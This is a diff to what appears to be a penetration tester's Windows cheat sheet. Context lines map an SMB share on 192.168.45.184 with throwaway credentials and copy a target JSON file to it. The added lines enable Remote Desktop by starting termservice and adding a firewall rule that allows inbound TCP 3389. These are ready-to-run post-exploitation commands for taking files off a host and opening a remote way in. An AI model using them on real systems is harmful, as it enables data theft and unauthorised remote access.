@@ -3525,3 +3525,10 @@ on winowds
 net use Y: \\192.168.45.184\share /user:abc abc
 cp target_file.json Y:
 ```
+
+enabling RDP
+```
+net localgroup "Remote Desktop Users"
+net start termservice
+netsh advfirewall firewall add rule name="Allow RDP" protocol=TCP dir=in localport=3389 action=allow
+```
